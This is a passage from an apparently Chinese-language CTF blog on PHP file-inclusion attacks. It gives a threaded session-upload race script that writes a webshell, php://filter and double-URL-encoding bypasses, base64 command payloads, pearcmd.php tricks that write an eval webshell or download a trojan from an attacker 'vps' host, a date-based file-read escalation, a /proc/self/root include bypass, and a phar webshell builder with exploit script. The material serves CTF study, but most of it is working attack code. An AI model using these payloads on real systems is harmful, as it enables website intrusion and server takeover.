punctuation">.</span>post<span class="token punctuation">(</span>                            <span class="token comment">#post文件上传</span>            url<span class="token punctuation">,</span>                                            <span class="token comment">#url</span>            cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                   <span class="token comment">#设置cookie为我们的sessid</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('ls');file_put_contents('/tmp/1.php','&lt;?php phpinfo();eval($_POST[1]); ?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">#写马或执行内容</span>            files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'k1he.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>                 <span class="token comment">#上传文的具体内容，文件名和文件内容</span>            <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"?page=/tmp/sess_"</span><span class="token operator">+</span>sessid                 <span class="token comment">#包含我们的session路径</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token operator">+</span>payload<span class="token punctuation">)</span>           <span class="token comment">#读取页面</span>        <span class="token keyword">if</span> <span class="token string">'k1he.txt'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                     <span class="token comment">#返回页面</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]retrying!!!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>                                  <span class="token comment">#双线程运行</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、file-put-content和死亡-逃逸"><a href="#4、file-put-content和死亡-逃逸" class="headerlink" title="4、file_put_content和死亡 逃逸"></a>4、file_put_content和死亡 逃逸</h2><p> <a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a> </p><p><a href="https://xz.aliyun.com/t/8163#toc-2">https://xz.aliyun.com/t/8163#toc-2</a> </p><pre class="line-numbers language-text" data-language="text"><code class="language-text">常用方法：php://filter/convert.base64-encode/resource=flag.phpphp://filter/resource=flag.phpphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.phpphp://filter/read=convert.quoted-printable-encode/resource=flag.phpcompress.zlib://flag.php过滤器字符串过滤器string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。strtoupper—将字符串转化为大写strtolower—将字符串转化为小写string.strip_tags使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。strip_tags—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。它使用与函数fgetss()一样的机制去除标记。转换过滤器如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页。https://www.php.net/manual/zh/filters.convert.php1convert.base64convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用base64_encode()和base64_decode()函数处理所有的流数据。convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用line-length个字符为 长度而截成块。如果给出了line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用base64_encode()再加上 chunk_split()相同。convert.quotedconvert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。convert.iconv.*这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。iconv — 字符串按要求的字符编码来转换convery.iconv.*的使用有两种方法:convert.iconv.&lt;input-encoding>.&lt;output-encoding> or convert.iconv.&lt;input-encoding>/&lt;output-encoding>支持的字符编码有一下几种（详细参考官方手册）https://www.php.net/manual/en/mbstring.supported-encodings.phpUCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*压缩过滤器虽然 压缩封装协议 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 zlib.* 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。?file=compress.zlib://flag.php加密过滤器mcrypt.*和 mdecrypt.*使用libmcrypt提供了对称的加密和解密。这两组过滤器都支持mcrypt扩展库中相同的算法，格式为 mcrypt.ciphername，其中ciphername是密码的名字，将被传递给mcrypt_module_open()。有以下五个过滤器参数可用：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">#发现在urldecode($file)，因为浏览器只会进行一次URL解码可以使用对关键字进行二次url编码绕过</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">重点：发现在urldecode($file)，因为浏览器只会进行一次URL解码可以使用对关键字进行二次url编码绕过file=%2570%2568%2570%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Ddecode%252Fresource%253Ds1mple%252E%2570%2568%2570base64编码以四个字符为一组，&lt;?php die('大佬别秀了');?>中还差两个字符才凑成4的倍数，因此要在content内容前面加两个任意字符aa,保证后面字符一起正确解码content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、没有过滤:但是过滤了php和等号，可以使用</p><p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/PmFh</code>然后补字符去除等号</p><p>6、过滤了base64个rot13</p><p><code>?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code></p><p><code>post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code>&#x2F;&#x2F;两个两个字符反转</p><h2 id="5、利用pearcmd-php从LFI到getshell"><a href="#5、利用pearcmd-php从LFI到getshell" class="headerlink" title="5、利用pearcmd.php从LFI到getshell"></a>5、利用pearcmd.php从LFI到getshell</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。<strong>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。</strong></p><p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php</p><p>并且php.ini当中 register_argc_argv&#x3D;On需要开启</p><ul><li>安装了pear（这样才能有pearcmd.php）</li><li>开启了<code>register_argc_argv</code></li><li>存在文件包含且可以包含后缀为php的文件且没有<code>open_basedir</code>的限制利用</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>pearcmd.php的参数：</p><p><img src="/images/image-20220903204044748-1663048886857.png" alt="image-20220903204044748"></p><p><img src="/images/image-20220903204104429-1663048886857.png" alt="image-20220903204104429"></p><p> 可以看见这里面有三个可能利用的参数，一个是<strong>p牛文中提到的config-create，一个install还有用过download</strong> config-create</p><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p>多加一个die，防止多个输出</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?file&#x3D;&#x2F;www&#x2F;server&#x2F;php&#x2F;52&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+config-create+&#x2F;&lt;?&#x3D;@eval($_POST[&#39;cmd&#39;]);die()?&gt;+&#x2F;tmp&#x2F;test.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;?file&#x3D;&#x2F;www&#x2F;server&#x2F;php&#x2F;52&#x2F;lib&#x2F;php&#x2F;peclcmd.php&amp;+install+http:&#x2F;&#x2F;vps&#x2F;1.php&#x2F;?file&#x3D;&#x2F;www&#x2F;server&#x2F;php&#x2F;52&#x2F;lib&#x2F;php&#x2F;peclcmd.php&amp;+install+http:&#x2F;&#x2F;vps&#x2F;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>文件就会被下载到&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;1.php，回显能看到</p><p>1.php（1.txt）中为一句话木马</p><h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>个人觉得这个比上面install舒服点，这个直接下载到web目录了，不用提前知道web目录具体路径</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?file&#x3D;&#x2F;www&#x2F;server&#x2F;php&#x2F;52&#x2F;lib&#x2F;php&#x2F;peclcmd.php&amp;+download+http:&#x2F;&#x2F;vps&#x2F;1.php&#x2F;?file&#x3D;%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%70%65%61%72%63%6d%64%2e%70%68%70&amp;+download+http:&#x2F;&#x2F;vps&#x2F;1.txt&#x2F;?file&#x3D;&#x2F;www&#x2F;server&#x2F;php&#x2F;52&#x2F;lib&#x2F;php&#x2F;peclcmd.php&amp;+download+http:&#x2F;&#x2F;vps&#x2F;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>1.php（1.txt）中为一句话木马</p><h2 id="例子2022ycb"><a href="#例子2022ycb" class="headerlink" title="例子2022ycb"></a>例子2022ycb</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">fliter</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>     <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">">"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"@"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"_"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"create"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"install"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pear"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fliter</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"QUERY_STRING"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Noooo0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了install和pear所以进行绕过</p><p>install 替换为download,pear用url绕过</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">file=%2f%75%73%72%2f%6c%6f%63%61%6c%2f%6c%69%62%2f%70%68%70%2f%70%65%61%72%63%6d%64%2e%70%68%70&amp;+download+http://vps/1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>download默认下载地址为当前目录</p><p>然后使用文件包含1.txt最后getshell</p><p>getshell发现&#x2F;flag访问权限不足</p><p>进行date提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">LFILE</span><span class="token operator">=</span>file_to_read./date <span class="token parameter variable">-f</span> <span class="token variable">$LFILE</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token function">date</span> <span class="token parameter variable">-f</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><h2 id="6、include-once-x2F-require-once重复包含限制绕过"><a href="#6、include-once-x2F-require-once重复包含限制绕过" class="headerlink" title="6、include_once&#x2F;require_once重复包含限制绕过"></a>6、include_once&#x2F;require_once重复包含限制绕过</h2><p>原理利用软连接 <code>/proc/self/root</code> 指向根目录</p><p>可以使用<code>/proc/self/root</code>不断重复，绕过重复限制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$hey_mean_then</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/html/www/hint.php</code></p><p>但是var被过滤，所以使用<code>proc/self/cwd/</code>（执行当前工作目录）绕过</p><p><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/hint.php</code></p><h2 id="7、phar文件包含"><a href="#7、phar文件包含" class="headerlink" title="7、phar文件包含"></a>7、phar文件包含</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php|data|ftp/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">'.txt'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phar脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">" &lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub，增加gif文件头</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" &lt;?php eval(\$_POST[1]);?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220913135554427.png" alt="image-20220913135554427"></p><p>上传到文件夹&#x2F;tmp&#x2F;phar.phar,因为tmp文件夹默认存在</p><p>exp.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://2c507d21-a151-4c39-adda-693c5b1f2502.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">upload_phar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># $file = $_POST['file'];</span>    <span class="token comment"># $content = $_POST['content'];</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token string">'/tmp/phar.phar'</span><span class="token punctuation">,</span><span class="token comment">#默认使用tmp文件夹，因为一般都会存在</span>            <span class="token string">'content'</span><span class="token punctuation">:</span> content        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token string">'phar:///tmp/phar.phar/shell'</span><span class="token punctuation">,</span>        <span class="token string">'content'</span><span class="token punctuation">:</span> <span 